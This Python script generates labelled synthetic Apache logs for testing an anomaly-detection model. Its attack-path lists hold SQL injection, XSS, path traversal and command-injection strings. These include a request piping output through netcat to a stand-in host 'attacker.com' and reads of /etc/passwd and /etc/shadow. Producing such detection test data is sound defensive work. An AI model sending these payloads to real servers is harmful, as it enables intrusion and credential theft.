#!/usr/bin/env python3
"""
Generate synthetic Apache logs with known attacks and anomalies for testing
anomaly detection model performance.

Generates 10,000 log entries with various attack patterns embedded.
"""

import random
import json
from datetime import datetime, timedelta
from pathlib import Path
from typing import List, Dict, Tuple

# Configuration
TOTAL_LOGS = 10000
ANOMALY_PERCENTAGE = 0.15  # 15% anomalies
OUTPUT_DIR = Path(__file__).parent.parent / 'data/apache_logs'
LOG_FILE = OUTPUT_DIR / 'synthetic_nodejs_apache_10k.log'
LABEL_FILE = OUTPUT_DIR / 'synthetic_apache_labels.json'

# Base timestamp
START_TIME = datetime(2024, 1, 1, 0, 0, 0)

# Normal user agents (legitimate browsers)
NORMAL_USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
]

# Malicious user agents (scanners, bots)
MALICIOUS_USER_AGENTS = [
    'sqlmap/1.7.2#stable (http://sqlmap.org)',
    'Nikto/2.1.6',
    'python-requests/2.28.1',
    'Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)',
    'Scrapy/2.8.0 (+https://scrapy.org)',
    'masscan/1.0 (https://github.com/robertdavidgraham/masscan)',
]

# Normal IPs (simulated legitimate users)
NORMAL_IPS = [f'192.168.1.{i}' for i in range(10, 50)]
NORMAL_IPS.extend([f'10.0.0.{i}' for i in range(100, 150)])

# Malicious IPs (simulated attackers)
MALICIOUS_IPS = [f'45.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}' for _ in range(20)]

# Normal paths (typical Node.js/Express app endpoints)
NORMAL_PATHS = [
    '/',
    '/api/users',
    '/api/products',
    '/api/orders',
    '/api/auth/login',
    '/api/auth/logout',
    '/static/css/style.css',
    '/static/js/app.js',
    '/static/images/logo.png',
    '/health',
    '/metrics',
    '/api/search?q=product',
    '/api/cart',
    '/api/checkout',
    '/docs',
    '/favicon.ico',
]

# Attack patterns
SQL_INJECTION_PATHS = [
    "/api/users?id=1' OR '1'='1",
    "/api/products?search=test' UNION SELECT * FROM users--",
    "/api/login?username=admin'--&password=x",
    "/search?q=' OR 1=1--",
    "/api/products?id=1; DROP TABLE users--",
    "/api/users?name=x' AND 1=(SELECT COUNT(*) FROM tabname)--",
]

XSS_PATHS = [
    "/api/search?q=<script>alert('XSS')</script>",
    "/api/comment?text=<img src=x onerror=alert(1)>",
    "/profile?name=<svg/onload=alert('XSS')>",
    "/api/post?content=<iframe src=javascript:alert(1)>",
]

PATH_TRAVERSAL_PATHS = [
    "/api/files?path=../../../../etc/passwd",
    "/download?file=../../config/database.yml",
    "/static/../../.env",
    "/api/read?file=..%2F..%2F..%2Fetc%2Fshadow",
]

COMMAND_INJECTION_PATHS = [
    "/api/ping?host=127.0.0.1;cat /etc/passwd",
    "/api/exec?cmd=ls | nc attacker.com 4444",
    "/api/system?command=whoami;id;uname -a",
]

BRUTE_FORCE_PATHS = [
    '/api/auth/login',
    '/admin/login',
    '/wp-admin',
    '/login',
]

SCANNING_PATHS = [
    '/admin',
    '/admin.php',
    '/phpmyadmin',
    '/.git/config',
    '/.env',
    '/config.php',
    '/web.config',
    '/backup.sql',
    '/.aws/credentials',
    '/api/v1/swagger.json',
]

def generate_timestamp(base_time: datetime, offset_seconds: int) -> str:
    """Generate Apache log timestamp"""
    dt = base_time + timedelta(seconds=offset_seconds)
    return dt.strftime('%d/%b/%Y:%H:%M:%S +0000')

def generate_normal_log(ip: str, timestamp: str, user_agent: str) -> Tuple[str, Dict]:
    """Generate a normal Apache log entry"""
    path = random.choice(NORMAL_PATHS)
    method = random.choice(['GET'] * 8 + ['POST'] * 2)  # 80% GET, 20% POST
    status = random.choice([200] * 90 + [304] * 8 + [404] * 2)  # Mostly successful
    size = random.randint(200, 5000)
    referrer = random.choice(['-', 'http://localhost:3000/', 'http://example.com/'])
    
    log_line = f'{ip} - - [{timestamp}] "{method} {path} HTTP/1.1" {status} {size} "{referrer}" "{user_agent}"'
    
    label = {
        'is_anomaly': False,
        'attack_type': None,
        'severity': 'normal',
    }
    
    return log_line, label

def generate_sql_injection_log(ip: str, timestamp: str, user_agent: str) -> Tuple[str, Dict]:
    """Generate SQL injection attack log"""
    path = random.choice(SQL_INJECTION_PATHS)
    method = random.choice(['GET', 'POST'])
    status = random.choice([200, 500, 403, 400])
    size = random.randint(100, 2000)
    
    log_line = f'{ip} - - [{timestamp}] "{method} {path} HTTP/1.1" {status} {size} "-" "{user_agent}"'
    
    label = {
        'is_anomaly': True,
        'attack_type': 'sql_injection',
        'severity': 'high',
    }
    
    return log_line, label

def generate_xss_log(ip: str, timestamp: str, user_agent: str) -> Tuple[str, Dict]:
    """Generate XSS attack log"""
    path = random.choice(XSS_PATHS)
    method = random.choice(['GET', 'POST'])
    status = random.choice([200, 400, 403])
    size = random.randint(100, 1500)
    
    log_line = f'{ip} - - [{timestamp}] "{method} {path} HTTP/1.1" {status} {size} "-" "{user_agent}"'
    
    label = {
        'is_anomaly': True,
        'attack_type': 'xss',
        'severity': 'medium',
    }
    
    return log_line, label

def generate_path_traversal_log(ip: str, timestamp: str, user_agent: str) -> Tuple[str, Dict]:
    """Generate path traversal attack log"""
    path = random.choice(PATH_TRAVERSAL_PATHS)
    method = 'GET'
    status = random.choice([403, 404, 500])
    size = random.randint(50, 500)
    
    log_line = f'{ip} - - [{timestamp}] "{method} {path} HTTP/1.1" {status} {size} "-" "{user_agent}"'
    
    label = {
        'is_anomaly': True,
        'attack_type': 'path_traversal',
        'severity': 'high',
    }
    
    return log_line, label

def generate_command_injection_log(ip: str, timestamp: str, user_agent: str) -> Tuple[str, Dict]:
    """Generate command injection attack log"""
    path = random.choice(COMMAND_INJECTION_PATHS)
    method = random.choice(['GET', 'POST'])
    status = random.choice([500, 403, 200])
    size = random.randint(100, 3000)
    
    log_line = f'{ip} - - [{timestamp}] "{method} {path} HTTP/1.1" {status} {size} "-" "{user_agent}"'
    
    label = {
        'is_anomaly': True,
        'attack_type': 'command_injection',
        'severity': 'critical',
    }
    
    return log_line, label

def generate_brute_force_sequence(ip: str, base_timestamp: str, user_agent: str, count: int = 10) -> List[Tuple[str, Dict]]:
    """Generate brute force attack sequence (multiple failed login attempts)"""
    logs = []
    path = random.choice(BRUTE_FORCE_PATHS)
    
    for i in range(count):
        # Parse timestamp and add seconds
        dt = datetime.strptime(base_timestamp, '%d/%b/%Y:%H:%M:%S +0000')
        dt = dt + timedelta(seconds=i)
        timestamp = dt.strftime('%d/%b/%Y:%H:%M:%S +0000')
        
        status = 401 if i < count - 1 else 200  # Last one succeeds
        size = random.randint(200, 800)
        
        log_line = f'{ip} - - [{timestamp}] "POST {path} HTTP/1.1" {status} {size} "-" "{user_agent}"'
        
        label = {
            'is_anomaly': True,
            'attack_type': 'brute_force',
            'severity': 'high',
            'sequence_part': f'{i+1}/{count}',
        }
        
        logs.append((log_line, label))
    
    return logs

def generate_scanning_log(ip: str, timestamp: str, user_agent: str) -> Tuple[str, Dict]:
    """Generate vulnerability scanning log"""
    path = random.choice(SCANNING_PATHS)
    method = 'GET'
    status = random.choice([404] * 8 + [403] * 2)  # Mostly 404s
    size = random.randint(50, 300)
    
    log_line = f'{ip} - - [{timestamp}] "{method} {path} HTTP/1.1" {status} {size} "-" "{user_agent}"'
    
    label = {
        'is_anomaly': True,
        'attack_type': 'scanning',
        'severity': 'medium',
    }
    
    return log_line, label

def generate_logs():
    """Generate all synthetic logs"""
    logs = []
    labels = {}
    
    # Calculate number of anomalies
    num_anomalies = int(TOTAL_LOGS * ANOMALY_PERCENTAGE)
    num_normal = TOTAL_LOGS - num_anomalies
    
    # Generate normal logs
    print(f"Generating {num_normal} normal logs...")
    for i in range(num_normal):
        ip = random.choice(NORMAL_IPS)
        timestamp = generate_timestamp(START_TIME, i * 2)
        user_agent = random.choice(NORMAL_USER_AGENTS)
        
        log_line, label = generate_normal_log(ip, timestamp, user_agent)
        logs.append((i + 1, timestamp, log_line, label))
    
    # Generate anomalous logs
    print(f"Generating {num_anomalies} anomalous logs...")
    
    # Distribution of attack types
    attack_generators = [
        (generate_sql_injection_log, 0.25),
        (generate_xss_log, 0.20),
        (generate_path_traversal_log, 0.15),
        (generate_command_injection_log, 0.10),
        (generate_scanning_log, 0.30),
    ]
    
    attack_counts = {}
    anomaly_offset = num_normal
    
    for attack_gen, proportion in attack_generators:
        count = int(num_anomalies * proportion)
        attack_type = attack_gen.__name__.replace('generate_', '').replace('_log', '')
        attack_counts[attack_type] = count
        
        for j in range(count):
            ip = random.choice(MALICIOUS_IPS)
            timestamp = generate_timestamp(START_TIME, (anomaly_offset + j) * 2)
            user_agent = random.choice(MALICIOUS_USER_AGENTS)
            
            log_line, label = attack_gen(ip, timestamp, user_agent)
            logs.append((anomaly_offset + j + 1, timestamp, log_line, label))
        
        anomaly_offset += count
    
    # Add some brute force sequences
    num_brute_force = 5
    print(f"Generating {num_brute_force} brute force sequences...")
    for k in range(num_brute_force):
        ip = random.choice(MALICIOUS_IPS)
        timestamp = generate_timestamp(START_TIME, (anomaly_offset + k * 20) * 2)
        user_agent = random.choice(['curl/7.68.0', 'python-requests/2.28.1'])
        
        bf_logs = generate_brute_force_sequence(ip, timestamp, user_agent, count=10)
        for idx, (log_line, label) in enumerate(bf_logs):
            logs.append((anomaly_offset + k * 10 + idx + 1, timestamp, log_line, label))
    
    # Sort by line number (chronological order)
    logs.sort(key=lambda x: x[0])
    
    # Write logs and labels
    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
    
    print(f"\nWriting logs to {LOG_FILE}...")
    with open(LOG_FILE, 'w') as f:
        for line_num, timestamp, log_line, label in logs:
            f.write(log_line + '\n')
            labels[str(line_num)] = {
                'line_number': line_num,
                'timestamp': timestamp,
                **label
            }
    
    print(f"Writing labels to {LABEL_FILE}...")
    with open(LABEL_FILE, 'w') as f:
        json.dump({
            'metadata': {
                'total_logs': len(logs),
                'normal_logs': num_normal,
                'anomalous_logs': num_anomalies,
                'anomaly_percentage': ANOMALY_PERCENTAGE * 100,
                'attack_distribution': attack_counts,
                'generation_date': datetime.now().isoformat(),
            },
            'labels': labels
        }, f, indent=2)
    
    # Print summary
    print(f"\n{'='*70}")
    print(f"SYNTHETIC LOG GENERATION COMPLETE")
    print(f"{'='*70}")
    print(f"Total logs generated:    {len(logs):,}")
    print(f"Normal logs:             {num_normal:,} ({num_normal/len(logs)*100:.1f}%)")
    print(f"Anomalous logs:          {num_anomalies:,} ({num_anomalies/len(logs)*100:.1f}%)")
    print(f"\nAttack distribution:")
    for attack_type, count in attack_counts.items():
        print(f"  {attack_type:<25} {count:,} logs")
    print(f"\nFiles created:")
    print(f"  Logs:   {LOG_FILE}")
    print(f"  Labels: {LABEL_FILE}")
    print(f"{'='*70}")

if __name__ == '__main__':
    generate_logs()
